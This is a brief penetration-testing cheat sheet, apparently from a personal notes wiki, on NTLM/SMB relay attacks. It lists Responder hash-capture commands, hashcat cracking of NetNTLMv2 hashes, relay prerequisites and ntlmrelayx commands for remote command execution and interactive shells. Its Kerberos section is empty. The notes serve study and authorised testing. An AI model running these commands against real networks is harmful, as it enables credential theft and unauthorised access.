# Relay Attacks

<details>

<summary>NTLM Relay/SMB Relay</summary>

* **Server Message Block**
  * `sudo responder -I <network-iface> -dP`  // -dPw DHCP, ProxyAuth, Wpad
  * `hashcat -m 5600 <hash-file> <passwords> --force`&#x20;
* **Prerequisites to relay NTLM hash**
  * SMB Signing should either be disabled or enabled but not enforced
  * Account needs relevant permissions on server to access requested resources. (Admin privilege)
* `sudo nano /etc/responder/Responder.conf` -> Turn off SMB and HTTP (not required - for learning purpose)
* `ntlmrelayx.py -tf targets.txt -smb2support` (-c “whoami”, -i )
* `impacket-ntlmrelayx -tf targets.txt -smb2support` (-c “whoami”, -i )

</details>

<details>

<summary>Kerberos Relay</summary>



</details>
